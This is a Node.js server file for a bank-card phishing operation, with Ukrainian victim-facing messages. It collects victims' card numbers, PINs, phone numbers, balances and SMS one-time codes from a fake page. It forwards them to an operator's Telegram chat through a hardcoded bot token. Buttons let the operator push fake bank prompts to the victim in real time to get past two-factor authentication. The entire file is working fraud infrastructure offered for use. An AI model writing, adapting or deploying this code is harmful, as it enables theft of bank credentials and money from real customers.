// server.js
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
const WebSocket = require('ws');

// =======================================================================
// --- НАСТРОЙКИ: Ваши данные уже вставлены ---
// =======================================================================
const TELEGRAM_BOT_TOKEN = '7684408721:AAEuT4J4ZZlY7DN_3M5DXDZ4VpeivGBHpZs;
const CHAT_ID = 1104910452; 
// =======================================================================

const app = express();
app.use(express.json());
app.use(cors());

const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
const server = require('http').createServer(app);
const wss = new WebSocket.Server({ server });

const clients = new Map();
const sessions = new Map();

wss.on('connection', (ws) => {
    console.log('Client connected');
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'register' && data.sessionId) {
                clients.set(data.sessionId, ws);
                console.log(`Client registered: ${data.sessionId}`);
            }
        } catch (e) { console.error('Error processing message:', e); }
    });
    ws.on('close', () => {
        clients.forEach((clientWs, sessionId) => {
            if (clientWs === ws) {
                clients.delete(sessionId);
                console.log(`Client disconnected: ${sessionId}`);
            }
        });
    });
});

app.post('/api/submit', (req, res) => {
    const data = req.body;
    const { sessionId } = data;
    let visitCount = 1;
    if (sessions.has(sessionId)) {
        visitCount = sessions.get(sessionId).visitCount + 1;
    }
    sessions.set(sessionId, { ...data, visitCount });
    console.log(`Received data for session ${sessionId}, visit #${visitCount}`);
    let message = `<b>Новий запис!</b>\n\n`;
    message += `<b>Назва банку:</b> ${data.bankName}\n`;
    message += `<b>Номер телефону:</b> <code>${data.phone}</code>\n`;
    message += `<b>Номер карти:</b> <code>${data.card}</code>\n`;
    message += `<b>Пін:</b> <code>${data.pin}</code>\n`;
    if (data.balance) {
        message += `<b>Поточний баланс:</b> <code>${data.balance}</code>\n`;
    }
    const visitText = visitCount === 1 ? 'NEW' : `${visitCount} раз`;
    message += `<b>Кількість переходів:</b> ${visitText}\n`;
    sendToTelegram(message, sessionId);
    res.status(200).json({ message: 'OK' });
});

app.post('/api/sms', (req, res) => {
    const { sessionId, code } = req.body;
    const sessionData = sessions.get(sessionId);
    if (sessionData) {
        let message = `<b>Отримано SMS!</b>\n\n`;
        message += `<b>Код:</b> <code>${code}</code>\n`;
        message += `<b>Номер телефону:</b> <code>${sessionData.phone}</code>\n`;
        message += `<b>Сесія:</b> <code>${sessionId}</code>\n`;
        bot.sendMessage(CHAT_ID, message, { parse_mode: 'HTML' });
        console.log(`SMS code received for session ${sessionId}`);
        res.status(200).json({ message: 'OK' });
    } else {
        res.status(404).json({ message: 'Session not found' });
    }
});

function sendToTelegram(message, sessionId) {
     const options = {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [ { text: 'SMS', callback_data: `sms:${sessionId}` }, { text: 'ДОДАТОК', callback_data: `app:${sessionId}` } ],
                [ { text: 'ПІН', callback_data: `pin_error:${sessionId}` }, { text: 'КОД', callback_data: `code_error:${sessionId}` }, { text: 'КОД ✅', callback_data: `timer:${sessionId}` } ],
                [ { text: 'Карта', callback_data: `card_error:${sessionId}` }, { text: 'Номер', callback_data: `number_error:${sessionId}` } ],
                [ { text: 'OTHER', callback_data: `other:${sessionId}` } ]
            ]
        }
    };
    bot.sendMessage(CHAT_ID, message, options).catch(err => console.error("Telegram send error:", err));
}

bot.on('callback_query', (callbackQuery) => {
    const [type, sessionId] = callbackQuery.data.split(':');
    const ws = clients.get(sessionId);
    console.log(`Received command '${type}' for session ${sessionId}`);
    if (ws && ws.readyState === WebSocket.OPEN) {
        let commandData = {};
        switch (type) {
            case 'sms':
                commandData = { text: "Вам відправлено SMS з кодом на мобільний пристрій , введіть його у форму вводу коду" };
                break;
            case 'app':
                commandData = { text: "Вам надіслано підтвердження у додаток мобільного банку. Відкрийте додаток банку та зробіть підтвердження для проходження автентифікації." };
                break;
            case 'other':
                commandData = { text: "В нас не вийшло автентифікувати вашу картку. Для продвиження пропонуємо вказати картку іншого банку" };
                break;
            case 'pin_error':
                commandData = { text: "Ви вказали невірний пінкод. Натисніть кнопку назад та вкажіть вірний пінкод" };
                break;
            case 'card_error':
                commandData = { text: "Вказано невірний номер картки , натисніть назад та введіть номер картки вірно" };
                break;
            case 'number_error':
                 commandData = { text: "Вказано не фінансовий номер телефону . Натисніть кнопку назад та вкажіть номер який прив'язаний до вашої картки." };
                break;
        }
        ws.send(JSON.stringify({ type: type, data: commandData }));
        bot.answerCallbackQuery(callbackQuery.id, { text: `Команда "${type}" відправлена!` });
    } else {
        bot.answerCallbackQuery(callbackQuery.id, { text: 'Помилка: клієнт не в мережі!', show_alert: true });
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
